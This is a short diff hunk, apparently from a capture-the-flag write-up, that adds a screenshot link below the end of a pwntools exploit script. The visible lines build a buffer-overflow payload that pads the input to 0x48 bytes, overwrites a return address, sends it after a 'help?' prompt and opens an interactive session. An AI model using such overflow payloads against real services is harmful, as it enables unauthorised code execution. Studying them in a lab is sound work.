@@ -41,3 +41,6 @@ payload = gimme + ((0x48 - len(gimme))* b'A') + p64(0x000000000040128e)
 io.sendlineafter(b'help?', payload)
 io.interactive()
 ```
+
+
+![image](https://user-images.githubusercontent.com/96965806/218292359-58e0670b-6da0-41fe-9c63-9bb30b1fee88.png)
